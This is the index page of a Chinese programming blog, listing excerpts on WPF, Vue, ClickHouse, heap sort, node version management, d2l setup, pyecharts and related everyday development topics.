<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta name="generator" content="Hugo 0.121.1">
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>编程爱好者博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="编程爱好者博客">
		<meta property="og:title" content="编程爱好者博客" />
<meta property="og:description" content="编程爱好者博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="https://bchobby.github.io/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/index.xml" title="编程爱好者博客">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程爱好者博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程爱好者博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/94e0dd8226ce46d5e1add9c96ba341a9/" rel="bookmark">
			WPF ItemsControl定义数据模板实现后台动态生成卡片
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 有时候需要制作设备监控页面，实时显示设备一下参数的实时值。为了避免设备参数变更导致需要更改上位机程序。因此想着能不能做一个模板，在后台配置数据库实现。设备参数的更新。
代码 定义 定义一个ViewModel类，这里实现接口
public class ValveVM : INotify { public ObservableCollection&lt;ValveMappingModel&gt; _valveList; public ObservableCollection&lt;ValveMappingModel&gt; ValveList { get { return _valveList; } set { if (_valveList == value) return; _valveList = value; OnPropertyChanged(); } } } 继承了INotify类，实现INotifyPropertyChanged接口
public class INotify : INotifyPropertyChanged { public event PropertyChangedEventHandler PropertyChanged; public void OnPropertyChanged([CallerMemberName] string propertyName = "") { if (PropertyChanged != null) PropertyChanged(this, new PropertyChangedEventArgs(propertyName)); } } 再建一个实体类用于数据模板
public class ValveMappingModel { public string ProjectType { get; set; } public string ProCode { get; set; } public string ProName { get; set; } public string AddressType { get; set; } public string DataType { get; set; } public int?
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/94e0dd8226ce46d5e1add9c96ba341a9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cb8b43588fe95b00d02bbf2103506295/" rel="bookmark">
			Edge浏览器ctrl&#43;C常常失灵？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		亲测好用：浏览器设置—上下文菜单—关闭【选择文本时显示迷你菜单】
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3b454478af4d476704f892351d4a97ad/" rel="bookmark">
			postman发送json嵌套， 后端 @RequestBody 接收不到
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		遇到了一个很奇葩的问题，具体是这样的：
postman 通过 post 方式发送请求，请求参数是一个嵌套的json，后端是@RequestBody修饰的实体类接参的，
具体的json数据：
{ "ipAddress":"192.168.110.179", "ipv6Address":"::", "portNo":"38050", "protocol":"HTTP", "macAddress":"ec:c8:9c:c4:5c:b3", "channelID":"1", "dateTime":"2021-12-14T19:23:52+08:00", "activePostCount":"157", "eventType":"ANPR", "eventState":"active", "eventDescription":"ANPR", "channelName":"IP CAPTURE CAMERA", "deviceID":"jnjtzf0001", "aNPR":{ "licensePlate":"车牌", "line":"1", "confidenceLevel":"0", "plateType":"unknown", "plateColor":"blue", "licenseBright":"0", "pilotsafebelt":"unknown", "vicepilotsafebelt":"unknown", "pilotsunvisor":"unknown", "vicepilotsunvisor":"unknown", "envprosign":"unknown", "dangmark":"unknown", "uphone":"unknown", "pendant":"unknown", "tissueBox":"unknown", "label":"unknown", "decoration":"unknown", "plateCharBelieve":"0", "speedLimit":"0", "illegalInfo":{ "illegalCode":"0" }, "vehicleType":"unknown", "featurePicFileName":"1", "detectDir":"8", "detectType":"1", "barrierGateCtrlType":"0", "alarmDataType":"0", "dwIllegalTime":"0", "vehicleInfo":{ "color":"white" }, "gPSInfo":{ "longitude":{ "degree":"117", "minute":"6", "sec":"49.910000" }, "latitude":{ "degree":"117", "minute":"6", "sec":"49.910000" } } }, "UUID":"602cf998-1dd2-11b2-a842-be6ebc977415", "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3b454478af4d476704f892351d4a97ad/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8308a81d4048cb06e1787cdf57269787/" rel="bookmark">
			Vue2和Vue3的主要区别
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、Vue响应式的底层实现不同 Vue2底层是通过es5的Object.defineProperty，使用Object.defineProperty()进行数据劫持，结合订阅发布的方式实现，有一定的局限性。
缺点：对数组更新的时候无法实现响应式，它内部有一个this.$set去实现
如果响应式定义的数据层级比较深（对象里面有对象，对象里面还有对象）它内部是 通过递归的形式去实现的
Vue3底层是通过es6的Porxy， 使用Proxy代理，使用ref或者reactive将数据转化为响应式数据，能够更好地支持动态添加属性和删除属性。
它解决了Vue2底层实现的缺点，对数组、层级比较深的对象处理都很优秀
缺点：浏览器兼容不是很好
二、生命周期有一定的区别 对于生命周期来说，Vue3整体上变化不大，只是大部分生命周期钩子名称上 + “on”，功能上是类似的。不过有一点需要注意，Vue3 在组合式API（Composition API）中使用生命周期钩子时需要先引入，而 Vue2 在选项API（Options API）中可以直接调用生命周期钩子。
Vue2------------------------------Vue3
初始化阶段：
beforeCreate ------------------ setup() created -------------------------- setup()
beforeMount -------------------- onBeforeMount
mounted -------------------------- onMounted 更新阶段：
beforeUpdate ------------------ onBeforeUpdate updated ------------------------- onUpdated activated ---------------------- onActivated deactivated ------------------- onDeactivated
销毁阶段：
beforeDestroy ---------------- onBeforeUnmount destroyed ---------------------- onUnmounted 三、支持碎片化，可以有多个根节点 Vue2 只支持一个根节点 ，在模板中如果使用多个根节点时会报错，
Vue3 支持多个根节点，也就是 fragment。即以下多根节点的写法是被允许的。
如下所示。
Vue3可以成功运行
Vue2报错 四，模板指令 在vue2或者vue3 中v-if和v-for可以同时存在，但是
在vue2中，v-for 优先级高于 v-if;
在vue3 中，v-if 优先级高于v-for;
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8308a81d4048cb06e1787cdf57269787/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/998710336259dbbf789ba5201e26d81c/" rel="bookmark">
			一种时间序列数据的一维卷积神经网络分类方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本文是根据阿里云天池【心跳信号分类预测】冠军攻略整理撰写，为时间序列数据的分类上提出更多解决方法。
数据集下载 登录阿里云天池，搜索心跳信号分类预测即可
赛题数据讲解 数据集均为205维的心跳时序数据，虽然是想同维度数据，很多人尝试梯度提升树，虽然说在某些方面梯度提升数类模型表现的比神经网络要好，但是这并不是绝对的，使用LGB、XGB模型需要自行构建很多特征，不能把这205维数据直接丢进去的。而神经网络则会自动寻优特征，本文就是在结构化数据分类神经网络的效果比树模型更好的一个例子。
主要的特征数据为 1 维信号振幅 (已被归一化至 0～1 了)，总长度均为 205 (205 个时间节点/心跳节拍)除波形数据外，没有任何辅助或先验信息可以利用波形数据均已被量化为 float16 类型的数值型特征，且没有类别型特征需要考虑没有缺失值，无需填充，非常理想 —— 事实上，未采集到的信号默认振幅就是 0，故不存在缺失值的问题这类非表格数据更适合用神经网络来处理，而非传统机器学习模型 该类别分为3类，0最多，1/2/3相对较少，可以基本判断出0为正常人心跳，1/2/3为不同心脏病病人的心跳
1.导入依赖库
import os import math import time import random import datetime import numpy as np import pandas as pd import seaborn as sns import matplotlib.pyplot as plt import tensorflow as tf import tensorflow.keras as K from tensorflow.keras import Sequential, utils, regularizers, Model, Input from tensorflow.keras.layers import Flatten, Dense, Conv1D, MaxPool1D, Dropout, AvgPool1D from imblearn.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/998710336259dbbf789ba5201e26d81c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/98ced57e9994e8ef7262bd09a81714b9/" rel="bookmark">
			选择排序——堆排序
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、堆排序的相关概念 1、堆的定义
从堆的定义可以看出，堆实质是满足如下性质的完全二叉树：二叉树中任一非叶子结点均小于(大于)它的孩子结点。
2、堆排序的定义
若在输出堆顶的最小值(最大值)后，使得剩余n- 1个元素的序列重又建成一个堆，则得到n个元素的次小值(次大值) ... .如此反复，便能得到一个有序序列，这个过程称之为堆排序。
二、堆的调整 1、如何在输出堆顶元素后，调整剩余元素为一个新的堆?
以小根堆为例：
①输出堆顶元素之后，以堆中最后一个元素替代之 ;
②然后将根结点值与左、右子树的根结点值进行比较，并与其中小者进行交换;
③重复上述操作②，直至叶子结点，将得到新的堆，称这个从堆顶至叶子的调整过程为"筛选"。
三、堆的建立 1、单结点的二叉树是堆;
2、在完全二叉树中所有以叶子结点(序号i &gt; n/2)为根的子树是堆。这样，我们只需依次将以序号为n/2，n/2 - 1，......, 1的结点为根的子树均调整为堆即可。
即:对应由n个元素组成的无序序列，“筛选” 只需从第n/2个元素开始。
3、如下图所示是一个典例
4、堆的建立过程其实就是堆排序过程。
四、堆的算法描述 void HeapSort( elem R[] ) { //对R[1 ]到R[n]进行堆排序 int i; for (i= n/2; i &gt;=1; i--） HeapAdjust( R,i,n); //建初始堆 for (i= n; i&gt;1; i--){ //进行n-1趟排序 Swap(R[1], R[i]); //根与最后一 个元素交换 HeapAdjust(R,1,i-1); //对R[1]到R[i -1]重新建堆 } } //HeapSort void HeapAdjust (elem R[ ], int S, int m) { /*已知R[s.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/98ced57e9994e8ef7262bd09a81714b9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6716869e982770ce87569c39b0c3fe93/" rel="bookmark">
			Mac 安装/更换node版本命令(值得收藏)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Mac 安装/更换node版本命令 收集node指令，方便查找，在mac终端里面输入如下指令
全局安装n模块：sudo npm install n -g
更新npm到最新版本：sudo npm install npm@latest -g
安装当前稳定版本：sudo n stable
安装最新版本：sudo n latest
卸载指定node版本：sudo n rm 版本号
查看node所有版本：npm view node versions
7.切换node版本（不会删除已安装的其他版本）：sudo n 版本号
node版本降级/升级（安装指定版本）： sudo n 版本号(例: sudo n 16.20.0)
查看版本号：node -v
清除node.js的cache: sudo npm cache clean -f
查看版本号：node -v
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/64cf74644eec6df6e0f5a9574d7e08cc/" rel="bookmark">
			大模型时代下智能文档处理核心技术大揭秘
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		​强烈推荐一个大神的人工智能的教程：http://www.captainai.net/zhanghan
大模型时代下智能文档处理核心技术大揭秘 前言一张图全览文档图像分析与预处理图像预处理的整体架构核心技术点应用场景 版面分析与还原整体架构核心技术点应用场景 AI安全文档图像篡改检测 大模型时代思考总结 前言 最近，中国图像图形大会在苏州圆满结束，本次论坛邀请了5位学术界和产业界的专家做特邀报告，共同交流文档图像分析与处理的前沿学术进展、在典型行业的规模化应用情况，并探讨未来技术及产业发展趋势。
随着人工智能技术的发展，智能图像处理成为了一种风靡全球的热门技术。智能图像处理可以帮助我们从大量的图像数据中提取最有价值的信息，为医疗、军事、安防等领域带来了重大的贡献。然而，图像处理的难点也随之而来，下面我们来简单介绍一下图像处理的难点以及解决方式的比对。
首先，图像处理的难点在于如何从大量的图像数据中获取有价值的信息。图像数据通常包含大量的冗余信息，如何选择有意义的数据进行处理，是图像处理的难点之一。其次，图像处理还需要解决如何去除噪声和失真的问题，这是因为在图像传输和处理过程中，往往会引入一些噪声和失真，导致图像质量下降。最后，图像处理还需要解决如何处理大规模的图像数据的问题，因为现在的图像数据量越来越大，传统的图像处理方式已经无法满足需求。
针对这些难点，现在有一些解决方式正在被广泛采用。
首先，深度学习技术被广泛应用于图像处理领域，可以通过训练模型来选择有价值的数据进行处理。
其次，图像处理技术也在不断发展，例如先进的降噪和去失真技术，可以有效地处理图像数据。
最后，分布式计算技术也被广泛应用于图像处理领域，可以处理大规模的图像数据，提高处理效率。
总之，智能图像处理是一项复杂的技术，需要解决如何从大量的图像数据中提取有价值的信息、去除噪声和失真、处理大规模的图像数据等难点。然而，通过现代化的技术手段，如深度学习、降噪和去失真技术、分布式计算等，这些难题正在被逐步克服，智能图像处理技术得到了广泛的应用和发展。
一张图全览 来自合合信息的丁凯博士在论坛中提到，智能文档处理场景多样化，遇到的挑战也很多，我们用一张图先来概览一下。
文档图像分析与预处理 图像预处理的整体架构 一张弯曲的图像文档想要处理成一张看着平整清晰的图像，可以处理方式为：图像输入–&gt;文档提取–&gt;手指去除–&gt;形变校正–&gt;图像增强，整体架构如图：
我们一起看一下经过上述步骤处理的效果展示，可以看到图像变得又清晰又平整：
核心技术点 切边增强：切边增强是指通过一系列的算法和技术将文档图像中的边缘清晰化，以便更好地识别文本和图像。常见的方法包括基于边缘检测的算法、基于卷积神经网络的算法等。
去除摩尔纹：摩尔纹是指在数字化图像中可能出现的一种干扰纹理，该干扰纹理会在图像处理过程中对文本和图像的识别造成影响。去除摩尔纹的方法包括基于滤波器的去噪算法、基于小波变换的算法等。
弯曲矫正：弯曲矫正是指对扫描文档图像中出现的弯曲和扭曲进行校正，以便更好地识别文本和图像。常见的方法包括基于图像处理技术的算法，如图像旋转、仿射变换等。
图片压缩：图片压缩是指将大尺寸的高清图片压缩成小尺寸的低分辨率图片，以便在存储和传输时节省空间和时间。常见的方法包括基于有损压缩的算法，如JPEG、PNG等。
PS检测：PS检测是指通过一系列的算法和技术，检测文档图像中是否存在Photoshop等图像编辑软件进行过处理的痕迹。常见的方法包括基于图像处理技术的算法，如图像分析、特征提取等。
应用场景 了解了基本的技术点，我们一起看一下使用场景，在下列图像文档中我们看到的问题有：弯曲、阴影、摩尔纹等，经过文档图像质量增强处理，可以得到一个全新的图像文档，功能还是相当的强大的。畅想一下，如果我们有一些古籍出现了老旧磨损的情况，我们经过图像增强处理可以得到清晰图像文档，以此可以流传下去是多么美好的一件事情。
版面分析与还原 整体架构 在一个复杂的有版面的图像处理时会涉及文字检测识别，版面元素检测识别，图层分离，排版布局等一系列深度学习模型，识别出各个模块之后还要糅合各个模块，并搭配文档渲染，最终才能生成用户可编辑的word或者excel。整体流程如下图：
核心技术点 版面分析与还原：版面分析与还原是指通过对文档图像进行分析，识别出其中的版面元素（如页眉、页脚、页码、标题等），并还原出原有的版面结构。该技术可以提高文档阅读体验和检索效率。常见的方法包括基于图像处理的算法，如边缘检测、形态学操作、分割等。
元素检测：元素检测是指通过一系列的算法和技术，对文档图像中的元素进行检测，包括文本、表格、图片、图形等。常见的方法包括基于深度学习的算法，如卷积神经网络(CNN)、循环神经网络(RNN)等。
元素识别：元素识别是指对文档图像中检测出的元素进行识别，如对文本进行OCR识别、对表格进行结构化识别等。常见的方法包括基于机器学习的算法，如SVM、朴素贝叶斯等，以及基于深度学习的算法，如基于CNN的字符识别、基于RNN的序列识别等。
版面还原：版面还原是指将经过元素检测、元素识别等处理后的文档图像，还原成原有的版面结构。常见的方法包括基于版面分析的算法，如基于文档结构的版面还原、基于分块的版面还原等。同时，版面还原也可以结合文档排版的一些规则和要求，进行自动化的排版处理，以提高文档的整体美观度和可读性
应用场景 在一个复杂版面中包含很多复杂的元素，包含：文本、印章、页眉、表格、骑缝章、二维码、条形码等。例如在识别发票信息时，我们除了要简单的识别文字外，还需要识别其中的印章等信息。识别了文档中的各个元素后，再对文档中版面进行排版布局，通过对视觉信息与流式布局间建立一组联系，最终获得一个与输入信息一致的段落布局。
AI安全 AI安全指的是在应用人工智能技术时，考虑到安全问题，防止恶意攻击和数据泄露等风险。在智能文档处理中，AI安全主要包括数据隐私保护、篡改分类和篡改检测等方面的技术。
篡改分类：篡改分类是指对文档中的篡改行为进行分类，将篡改分为有害篡改和无害篡改两类。有害篡改指恶意篡改，如篡改文本内容、插入恶意代码等，而无害篡改指无意的篡改，如错别字更正、排版调整等。常见的方法包括基于机器学习的算法，如决策树、朴素贝叶斯等。
篡改检测：篡改检测是指对文档进行检测，判断文档是否被篡改。常见的方法包括基于图像特征的算法，如SIFT、SURF等，以及基于机器学习的算法，如支持向量机(SVM)、随机森林等。
合成检测：合成检测是指对文档进行检测，判断文档中是否存在合成图像。常见的方法包括基于图像特征的算法，如重心法、梯度法等，以及基于深度学习的算法，如基于卷积神经网络(CNN)的合成图像检测。
AI生成检测：AI生成检测是指对文档中的图像进行检测，判断图像是否是由人工智能生成的。常见的方法包括基于对抗生成网络(AGN)的检测方法，如基于对抗样本的检测方法、基于对抗损失的检测方法等。此外，也可以通过对生成图像的纹理、结构等特征进行分析，判断图像的真实性。
文档图像篡改检测 随着电子设备和图像处理软件的普及，修改图片的门槛和成本变得越来越低。据悉，图像篡改分为“全局篡改”和“局部篡改”，全局篡改包括修改图片饱和度与对比度、增强颜色；局部篡改包括复制粘贴、拼接组合、擦除，例如卡证、票据的篡改，一般涉及图像上的部分字段、印章图案等，属于局部篡改。
图像内容安全是AI安全的重点领域，如可对文本篡改痕迹进行精准检测，将为图像内容安全提供保障。针对这些篡改内容也有一套完整的系统架构:
大模型时代思考 随着chatGpt和Gpt4的到来，大模型时代已悄悄走进我们的生活，看过GPT4发布会的朋友有没有被一个场景震惊到，主持人在笔记本上简单的画出了他对一个网站的需求，GPT就可以阅读手写文本快速生成网页。作为一名程序开发者，看到这个使用场景是无比的震惊，心想，真香啊，一个网站几分钟就生成好了，又看了看自己写的代码，心想：珍惜吧，能写代码的时光。
除此之外，GPT4还可以解释漫画：
以此来看，大模型识别中OCR模型的设计仍然很重要，同时也带来了一些机遇：
大模型仍有很多不足要充分利用大模型特征表示和语言能力从而可以解决更多智能识别场景不同任务的专用模型和学习算法仍大有可为。 总结 随着人工智能技术的迅猛发展，智能文档处理成为了当前的一大热点。智能文档处理技术可以帮助用户更加高效地获取、管理和利用文档中的信息，提高了用户的工作效率和文档价值。同时，智能文档处理技术也为企业、政府等机构提供了更加智能、高效的文档处理解决方案。
智能文档处理的契机在于，随着信息化时代的到来，文档数量和复杂度不断增加，传统的文档处理方法已经无法满足用户的需求。而人工智能技术的发展，为文档处理提供了更加高效、精准的解决方案，使得文档处理可以更好地适应信息化时代的需求。智能文档处理技术可以对文档进行自动化处理、智能化分析、人工智能应用等，实现了文档的自动化处理，从而提高了文档的使用价值和效率。
大模型时代已经不仅仅局限于文档对文档的识别，还可以做到对图像进行解释。文档分析与识别快速进步，但仍有很大研究空间，同时给了我们一些新方向，如：语义信息提取，跨模态的融合，面向应用的推理决策等。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/19e682e4646c4e2c23d492c1f34965ab/" rel="bookmark">
			Clickhouse-file：基于Clickhouse-local实现Clickhouse高效写入数据
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 ClickHouse是一个用于OLAP（在线分析处理）的列式数据库管理系统，它专门为大数据量和高并发场景而设计。ClickHouse具有快速的扫描和聚合海量数据的能力，并且支持高并发查询，使其在处理数据分析任务方面比传统的行存储数据库更具优势。ClickHouse是一个开源项目，可以在较少的硬件资源上运行，并且可以轻松地水平扩展，以适应不断增长的数据量和流量。在快速增大的数据量的情况下，使用传统的数据写入模式，如：JDBC、CSV，会增大Clickhouse服务的数据解析压力。那是否有方法一方面能够提升数据写入量，另一方面减少Clickhouse的服务数据解析、写入压力呢？
1. 常用clickhouse flink connector 基于Clickhouse-jdbc 使用官方提供的Clickhouse-jdbc驱动，通过SQL的形式将数据提交到Clickhouse服务器。优势是灵活性最高，但是在大数据量写入的情况下该方法会触发频繁的后台文件合并，甚至会出现“too many parts”的错误，同时大量的SQL解析对Clickhouse服务器有影响。
官方插件（基于CSV） 将数据源流转化为CSV格式数据，并通过Http请求批量发送到Clickhouse。优势在于不需要任何驱动依赖，格式简单。缺点是稳定性差，对网络稳定性要求高
项目地址：GitHub - ivi-ru/flink-clickhouse-sink: Flink sink for Clickhouse
基于clickhouse-file插件 Clickhouse-file插件，其主要实现方式是，将数据写入到CSV文件，然后通过Clickhouse-local将CSV数据文件转换为Clickhouse-file数据文件，然后将CLickhouse-file上传到远程Clickhouse服务器，用户通过Clickhouse查询数据。其优势是处理大数据量速度快，并且由于在本地生成数据文件，对Clickhouse服务器压力相对较小。缺点是配置复杂度高，通用性较差。其相对于JDBC模式的显著优势是，处理海量数据对服务器造成的压力较小。现在已开源Clickhouse-file的产品有：ClickhouseFile | Apache SeaTunnel，项目仓库地址：seatunnel/seatunnel-connectors-v2/connector-clickhouse · GitHub
2. Clickhouse-file模式 基于Clickhouse-file 模式的，其主要实现方式是，将数据写入到CSV文件，然后通过Clickhouse-local将CSV数据文件转换为Clickhouse-file数据文件，然后将CLickhouse-file上传到远程Clickhouse服务器，用户通过Clickhouse查询数据。现在已开源的积压Clickhouse-file的项目有：ClickhouseFile | Apache SeaTunnel
2.1 基于Clickhouse file模式处理流程 Clickhouse Sink接收到源端数据源数据流
根据本地缓存的集群的数据分片策略，将数据分别写入到不同的本地缓存CSV文件
在同步执行数据快照时或缓存已满，使用Clickhouse Local将加载缓存的CSV数据文件，并生成本地Clickhouse文件
将Clickhouse本地文件，通过文件传输工具rsync传输到远程Clickhouse数据目录
数据文件Attach到Clickhouse Server，用户可以从Clickhouse中查询数据
2.2 关键技术组件 clickhouse-local clickhouse local，开发人员可以直接从命令行使用SQL命令（使用clickhouse SQL方言），提供了一种简单高效的方式来访问clickhouse功能，而无需完整安装clickhouse。用户可以使用clickhouse在不连接clickhouse服务器的情况下，生成clickhouse文件数据，并且支持大多数clickhouse engine。根据这个特性，我们可以在本地将数据通过clickhouse local工具，在本地生成clickhouse数据文件，此文件传输到远程clickhouse数据目录，用户即可查询新的数据。
​ 参考资料：clickhouse-local | ClickHouse Docs
clickhouse 临时文件传输到clickhouse服务器
支持两种文件传输方式：rsync、scp
相同点：
均是基于ssh协议的安全传输工具。都可以通过远程主机的IP地址或域名进行连接，并且需要用户名和密码进行身份验证。传输数据时都会使用加密技术来保证数据的安全性。 不同点：
scp只支持文件传输，而rsync除了可以传输文件，还可以传输目录、链接、设备文件等。rsync比scp更加灵活，能够自动检测并同步源和目标之间的差异，只传输发生变化的部分，从而提高传输效率。rsync复制时可以指定多个源目录，将它们合并到一个目的目录中，而scp只能传输单个文件或目录。rsync还支持增量备份，并且可以在网络传输中断后恢复传输，而scp则不支持这些特性。 Linux rsync Linux rsync是一种用于文件同步和备份的命令行工具。它能够快速、可靠地将本地或远程计算机之间的文件进行同步，同时可以压缩数据传输并保证数据完整性。rsync的主要优点包括增量备份、支持复制硬链接和符号链接、支持过滤器以排除或包含特定文件和目录等功能。使用rsync可以帮助用户快速而有效地管理和备份文件，特别是在需要将文件从一个位置复制到另一个位置的情况下，比如在服务器之间同步数据。
Rsync可用于镜像数据、增量备份、在系统之间复制文件，并可替代scp、sftp和cp命令。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/19e682e4646c4e2c23d492c1f34965ab/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8df6e5b81fc4455fbc0d6cc893463a8b/" rel="bookmark">
			package.json与package-lock.json区别需不需要被.gitignore文件忽略
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 先要搞清楚package.json与package-lock.json文件分别是什么作用
.gitignore文件是干什么的-主页文章有
介绍
package.json
1.项目名称版本号，描述，以及运行命令和一些配置的node环境命令
2.记录那些包会在开发环境中用到，哪些包会在开发环境和生产环境中同时用到
3.npm i 下包时会根据-D -S 把包分别记录在不同环境文件夹下
4.npm i 的话，默认是安装在dependencies中，也就是说生产和开发都会用到。
语法规范
package-lock.json
1.记录了包的具体版本，下载的地址，和一些基本信息
.gitignore文件忽略
git提供为团队开发时，剔除一下没有用的文件，方便共享管理代码。因为代码很小，主要时第三方包在占位置
总结：
1.至于package-lock.json要不要放在.gitignore忽略文件中取决于代码规范和要求，
2.package.json不可以忽略，ackage-lock,json看情况（package.json有没有确定到具体版本）和要求（公司规范）来忽略
2.package.json控制大版本，package-lock,json，控制小版本。若无package-lockjson，依赖会根据package.json文件语法规范当来安装包的版本。若有package-lockjson，大版本小版本都能控制
总结：
经过这一趟流程下来相信你也对 package.json与package-lock.json区别需不需要被.gitignore文件忽略 有了初步的深刻印象，但在实际开发中我 们遇到的情况肯定是不一样的，所以我们要理解它的原理，万变不离其宗。加油，打工人！
什么不足的地方请大家指出谢谢 -- 風过无痕
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ee9a6fa9844cfd2ae886b0befba815d9/" rel="bookmark">
			取消谷歌浏览器自动打断点（抛异常时）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		产生场景
开发时每次向控制台抛异常时，谷歌浏览器都会自动帮我们打断点，需要我们自己放开才行其实是我们在打断点调试时，不小心开启了有异常帮我们自动打断点的设置。取消这个设置就可以了。 实现过程-如图
总结：
经过这一趟流程下来相信你也对 取消谷歌浏览器自动打断点（抛异常时） 有了初步的深刻印象，但在实际开发中我 们遇到的情况肯定是不一样的，所以我们要理解它的原理，万变不离其宗。加油，打工人！
什么不足的地方请大家指出谢谢 -- 風过无痕
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cc4a878b075ff1d79efc7bcc76803dd3/" rel="bookmark">
			d2l学习——第一章Introduction
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		x.0 环境配置 使用d2l库，安装如下：
conda create --name d2l python=3.9 -y conda activate d2l pip install torch==1.12.0 torchvision==0.13.0 pip install d2l==1.0.0b0 mkdir d2l-en &amp;&amp; cd d2l-en curl https://d2l.ai/d2l-en.zip -o d2l-en.zip unzip d2l-en.zip &amp;&amp; rm d2l-en.zip cd pytorch 如果安装不上d2l可以用下面的方法：
pip install git+https://github.com/d2l-ai/d2l-en
x.1 key components in ML 就和统计学习方法书中说的一样，机器学习也可以分为几个核心要义，Data, Models, Objective Functions, Optimization Algorithms， 其中：
Data: 用来学习的数据Model: 如何转换/translate数据的模型Objective Function: 目标函数，用来量化模型有效性Optimization Algorithm: 调整模型参数以优化目标函数的算法 整个机器学习的过程就是一轮一轮的数据迭代，通过下面的图更方便记忆：
x.2 Kinds of Machine Learning Problems 机器学习分类主要为两大类，如下所示：
Supervised Learning RegressionClassificationTaggingSearchRecommender SystemsSequence Learning Unsupervised and Self-Supervised Learning Interacting with an EnvironmentReinforcement Learning 其中自监督学习也可以当做是无监督学习的一种，例如GAN就是将输入当做输出来进行真假标签的判定。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b56eeab65d134135570a28c3ed75d9d8/" rel="bookmark">
			pyecharts的一些简单实践应用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
前言：
一.多重柱形图
1.首先将我们所需要的包导入一下，数据读取出来
2.将男生和女生通过gropby(by=[])方法分组聚合拿到我们制成图形的数据
3.将数据类型转换成我们需要的list对象，然后把数据赋值以方便后面使用
4.最后画图与配置项的介绍
init_opts=opts.InitOpts(width='600px',height='400px')初始化图形的大小
color可调整柱形的颜色
gap为柱子之间的间隔
.set_global_opts中的title_opts=opts.TitleOpts配置项可设置整个图形的标题与副标题
=v=最后的效果为：
二.色阶图
1.首先还是将我们所需要的包导入一下，数据读取出来
2.然后将我们需要的数据拿出来打包一下
3.最后通过销售总数进行各身份色阶的变化制作图形与配置项的介绍
⊙▽⊙图片不能给你们看，运行一个就可以看到啦（才不是图片违规了呢）
三.二维折线图
1.首先将我们的需要制成图形的数据读取进来
2.这里我所使用的数据的“日期”序列是时间对象序列，时间对象数据无法在pyecharts的坐标轴数据中使用，需要转化为字符串或者数字对象
3.所以我们做一点简单的处理转化为字符串提取我们需要的片段就可以开始画图了
配置项的介绍：
.add_xaxis(xaxis_data=rq)将我们刚刚转换的字符串设置为x轴
series_name为线和点的名称
itemstyle_opts=opts.ItemStyleOpts设置点的样式
linestyle_opts=opts.LineStyleOpts设置线条的样式
♡&gt;𖥦&lt;)!!最后的效果图为：
四.水球图
配置项解释：
data表示系列数据，格式[a,b,c,...]，有多个数字时，数字标签显示的是a，其他数字以波浪形式呈现。
shape可以设置水滴图形状，有' circle', 'rect', 'roundRect', 'triangle', 'diamond', 'pin', 'arrow' 可选
color设置波浪的颜色
background_color设置背景颜色
is_outline_show = True,是否显示边框（否为False）
